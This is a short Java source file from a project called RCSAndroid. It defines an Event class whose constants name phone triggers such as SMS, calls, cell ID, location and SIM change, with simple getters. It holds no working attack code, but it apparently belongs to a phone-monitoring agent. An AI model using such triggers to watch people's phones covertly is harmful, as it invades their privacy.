/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

public class Event {
	/**
	 * Events definitions
	 */
	public static int EVENT				= 0x2000;
	public static int EVENT_TIMER       = EVENT + 0x1; // Timer Event
	public static int EVENT_SMS         = EVENT + 0x2; // On Sms Event
	public static int EVENT_CALL        = EVENT + 0x3; // On Call Event
	public static int EVENT_CONNECTION  = EVENT + 0x4; // On Connectivity Event
	public static int EVENT_PROCESS     = EVENT + 0x5; // On Process Event
	public static int EVENT_CELLID      = EVENT + 0x6; // On CellID Event
	public static int EVENT_QUOTA       = EVENT + 0x7; // On Disk Quota Event
	public static int EVENT_SIM_CHANGE  = EVENT + 0x8; // On Sim Change Event
	public static int EVENT_LOCATION    = EVENT + 0x9; // On Position Event
	public static int EVENT_AC          = EVENT + 0xA; // On AC (power charger) Event
	public static int EVENT_BATTERY     = EVENT + 0xB; // On Battery Level Event
	public static int EVENT_STANDBY     = EVENT + 0xC; // On Standby Event

	/**
	 * Event type
	 */
	private int eventType;

	/**
	 * Event unique ID
	 */
	private int eventId;

	/**
	 * Event status: enabled, disabled, running, stopped
	 */
	private int eventAction;

	/**
	 * Parameters
	 */
	private byte[] eventParams;

	public Event(int type, int id, int action, byte[] params) {
		this.eventType = type;
		this.eventId = id;
		this.eventAction = action;
		this.eventParams = params;
	}

	public int getType() {
		return this.eventType;
	}

	public int getId() {
		return this.eventId;
	}

	public int getAction() {
		return this.eventAction;
	}

	public byte[] getParams() {
		return this.eventParams;
	}
}
